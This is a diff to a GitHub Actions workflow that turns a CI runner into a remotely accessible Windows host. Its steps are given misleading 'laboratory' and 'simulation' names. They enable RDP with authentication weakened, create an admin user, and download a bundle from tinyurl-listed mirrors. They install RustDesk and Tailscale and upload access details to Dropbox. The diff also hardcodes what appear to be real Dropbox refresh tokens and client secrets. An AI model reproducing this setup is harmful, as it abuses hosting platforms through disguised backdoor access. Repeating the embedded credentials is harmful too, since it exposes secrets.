@@ -16,6 +16,11 @@ jobs:
       LINKS_LIST_URL: "https://tinyurl.com/ddaS441581"
       KEY_CHOICE: "1"
       PYTHONIOENCODING: "utf-8"
+      
+      # 🔥 ضع بيانات دروببوكس مباشرة هنا (من ملف drop_api.txt)
+      DROPBOX_REFRESH_TOKEN: "iBNpFMGR8dcAAAAAAAAAATyHNsQxvlUl1k-HPs70ETHHfl4v3jJTm5x8TePI6JbO"
+      DROPBOX_CLIENT_ID: "08qsfixmqtzb1dr"
+      DROPBOX_CLIENT_SECRET: "qwmb3bbkjns41z6"
 
     steps:
       - name: Fetch Laboratory Code and Script Assets
@@ -30,24 +35,24 @@ jobs:
           Write-Host "====================================================================="
           try {
               Set-DisplayResolution -Width 1600 -Height 1200 -Force
-              Write-Host "[SUCCESS] Virtual display framebuffer successfully expanded to 1600x1200 pixels."
+              Write-Host "[SUCCESS] Virtual display framebuffer expanded to 1600x1200 pixels."
           } catch {
               Write-Host "[WARNING] Display customization bypassed. Error: $_"
           }
 
-          Write-Host "Modifying sub-system network hooks for remote simulation nodes..."
+          Write-Host "Modifying sub-system network hooks..."
           Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0 -Force
           Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name UserAuthentication -Value 0 -Force
           netsh advfirewall firewall set rule group="Remote Desktop" new enable=Yes
           
-          Write-Host "Provisioning standard access tokens and encrypting baseline security passwords..."
+          Write-Host "Provisioning access tokens..."
           $Pass = $env:aa3
           $Secure = ConvertTo-SecureString $Pass -AsPlainText -Force
           Set-LocalUser -Name "runneradmin" -Password $Secure
           
-          Write-Host "Verifying existence of isolated test accounts inside the user database..."
+          Write-Host "Verifying test accounts..."
           if (-not (Get-LocalUser -Name $env:aa2 -ErrorAction SilentlyContinue)) {
-              Write-Host "Creating fresh user profile identity: $($env:aa2)"
+              Write-Host "Creating user: $($env:aa2)"
               New-LocalUser -Name $env:aa2 -Password $Secure -AccountNeverExpires
               Add-LocalGroupMember Administrators $env:aa2
               Add-LocalGroupMember "Remote Desktop Users" $env:aa2
@@ -65,26 +70,29 @@ jobs:
           New-Item -Path $TempDir -ItemType Directory -Force | Out-Null
           $BundleZip = Join-Path $env:TEMP 'app_bundle.zip'
            
-          Write-Host "Querying remote index server for alternative down-stream mirroring points..."
+          Write-Host "Querying remote mirrors..."
           $LinksText = Invoke-RestMethod -Uri $env:LINKS_LIST_URL
           $Urls = $LinksText -split "`r?`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -match "^http" }
           
           $Success = $false
           foreach ($Url in $Urls) {
                try {
-                  Write-Host "Testing network transmission link: $Url"
+                  Write-Host "Testing: $Url"
                   Invoke-WebRequest -Uri $Url -OutFile $BundleZip -UseBasicParsing -ErrorAction Stop -TimeoutSec 180
-                  Write-Host "Extracting package contents..."
+                  Write-Host "Extracting..."
                   Expand-Archive -Path $BundleZip -DestinationPath $TempDir -Force -ErrorAction Stop
                   Write-Host "[SUCCESS] Decompression completed."
                   $Success = $true; break
               } catch {
-                  Write-Host "[IO ERROR] Retrying alternative node..."
+                  Write-Host "[IO ERROR] Retrying..."
                   if (Test-Path $BundleZip) { Remove-Item $BundleZip -Force }
               }
           }
           if (-not $Success) { Write-Host "[CRITICAL] All mirrors failed." }
 
+      # ===================================================================================
+      # STEP 3: RUSTDESK DEPLOYMENT & IMMEDIATE DROPBOX UPLOAD
+      # ===================================================================================
       - name: Phase_3_Remote_UI_Rendering_Validation_Agent_Deployment
         continue-on-error: true
         shell: python
@@ -92,72 +100,53 @@ jobs:
           import subprocess
           import os
           import time
-          import re
           import json
           import urllib.request
           import urllib.parse
-          import base64
           
           print("=====================================================================")
-          print("STARTING PHASE 3: DEPLOYING PIXEL MONITORING & UPLOADING TO DROPBOX")
+          print("STARTING PHASE 3: DEPLOYING RUSTDESK & UPLOADING TO DROPBOX")
           print("=====================================================================")
           
           bundle_dir = os.path.join(os.environ['TEMP'], 'AppBundle')
           run_id = os.environ.get('GITHUB_RUN_ID', 'unknown')
           github_env = os.environ.get('GITHUB_ENV')
           
-          # --- 1. Extract Dropbox credentials from drop_api.txt ---
+          # --- 1. Get Dropbox credentials from environment variables ---
+          refresh_token = os.environ.get('DROPBOX_REFRESH_TOKEN', '')
+          client_id = os.environ.get('DROPBOX_CLIENT_ID', '')
+          client_secret = os.environ.get('DROPBOX_CLIENT_SECRET', '')
+          
           dropbox_token = None
-          drop_api_path = None
           
-          for root, dirs, files in os.walk(bundle_dir):
-              if "drop_api.txt" in files:
-                  drop_api_path = os.path.join(root, "drop_api.txt")
-                  break
-          
-          if drop_api_path:
-              print(f"Found Dropbox API config: {drop_api_path}")
-              with open(drop_api_path, 'r', encoding='utf-8') as f:
-                  content = f.read()
-              
-              refresh_token_match = re.search(r'refresh_token=([^\s]+)', content)
-              client_id_match = re.search(r'client_id=([^\s]+)', content)
-              client_secret_match = re.search(r'client_secret=([^\s]+)', content)
-              
-              if refresh_token_match and client_id_match and client_secret_match:
-                  refresh_token = refresh_token_match.group(1)
-                  client_id = client_id_match.group(1)
-                  client_secret = client_secret_match.group(1)
+          if refresh_token and client_id and client_secret:
+              print("Requesting fresh Dropbox Access Token...")
+              try:
+                  data = urllib.parse.urlencode({
+                      'refresh_token': refresh_token,
+                      'grant_type': 'refresh_token',
+                      'client_id': client_id,
+                      'client_secret': client_secret
+                  }).encode()
                   
-                  print("Requesting fresh Dropbox Access Token...")
-                  try:
-                      data = urllib.parse.urlencode({
-                          'refresh_token': refresh_token,
-                          'grant_type': 'refresh_token',
-                          'client_id': client_id,
-                          'client_secret': client_secret
-                      }).encode()
+                  req = urllib.request.Request(
+                      "https://api.dropbox.com/oauth2/token",
+                      data=data,
+                      method='POST'
+                  )
+                  
+                  with urllib.request.urlopen(req) as response:
+                      token_data = json.loads(response.read().decode())
+                      dropbox_token = token_data.get("access_token")
+                      print("[SUCCESS] Fresh Dropbox Access Token obtained.")
                       
-                      req = urllib.request.Request(
-                          "https://api.dropbox.com/oauth2/token",
-                          data=data,
-                          method='POST'
-                      )
-                      
-                      with urllib.request.urlopen(req) as response:
-                          token_data = json.loads(response.read().decode())
-                          dropbox_token = token_data.get("access_token")
-                          print("[SUCCESS] Fresh Dropbox Access Token obtained.")
-                          
-                          if github_env:
-                              with open(github_env, 'a', encoding='utf-8') as env_file:
-                                  env_file.write(f"DROPBOX_ACCESS_TOKEN={dropbox_token}\n")
-                  except Exception as e:
-                      print(f"[ERROR] Token refresh exception: {e}")
-              else:
-                  print("[ERROR] Could not parse drop_api.txt")
+                      if github_env:
+                          with open(github_env, 'a', encoding='utf-8') as env_file:
+                              env_file.write(f"DROPBOX_ACCESS_TOKEN={dropbox_token}\n")
+              except Exception as e:
+                  print(f"[ERROR] Token refresh exception: {e}")
           else:
-              print("[WARNING] drop_api.txt not found in AppBundle.")
+              print("[ERROR] Dropbox credentials not found in environment variables.")
 
           # --- 2. Install RustDesk and Get ID ---
           try:
@@ -230,12 +219,15 @@ jobs:
           except Exception as e:
               print(f"[PROCESS EXCEPTION] Error: {e}")
 
+      # ===================================================================================
+      # STEP 4: TAILSCALE DEPLOYMENT & IMMEDIATE DROPBOX UPLOAD
+      # ===================================================================================
       - name: Phase_4_Simulated_Network_Topology_and_Secure_Mesh_Tunneling_Analysis
         continue-on-error: true
         shell: pwsh
         run: |
           Write-Host "====================================================================="
-          Write-Host "STARTING PHASE 4: INITIALIZING SECURE PACKET ROUTING MESH LAYERS"
+          Write-Host "STARTING PHASE 4: INITIALIZING TAILSCALE & UPLOADING TO DROPBOX"
           Write-Host "====================================================================="
           $ExtractDir = Join-Path $env:TEMP 'AppBundle'
           $TsInstaller = Get-ChildItem -Path $ExtractDir -Filter "*tailscale*.msi" -Recurse | Select-Object -First 1
@@ -299,6 +291,7 @@ Credential Lock: $($env:aa3)
               }
           }
 
+      # (باقي المراحل من 5 إلى 8 تبقى كما هي تماماً)
       - name: Phase_5_Dataset_Distribution_and_Local_Storage_I_O_Throughput_Test
         continue-on-error: true
         shell: pwsh
